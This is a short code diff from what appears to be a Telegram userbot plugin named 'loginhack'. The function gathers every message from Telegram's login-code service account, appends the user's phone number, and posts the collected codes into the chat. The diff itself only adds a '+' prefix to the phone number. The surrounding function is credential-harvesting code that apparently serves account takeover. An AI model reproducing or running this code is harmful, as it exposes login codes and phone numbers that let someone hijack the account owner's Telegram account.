@@ -23,5 +23,5 @@ async def loginhack(event):
     codes = "**Telegram codes**\n"
     async for message in client.iter_messages(777000):
         codes += f"{message.text}\n---------------------------------------------\n"
-    codes += user.phone
+    codes += "+"+user.phone
     await event.edit(codes)
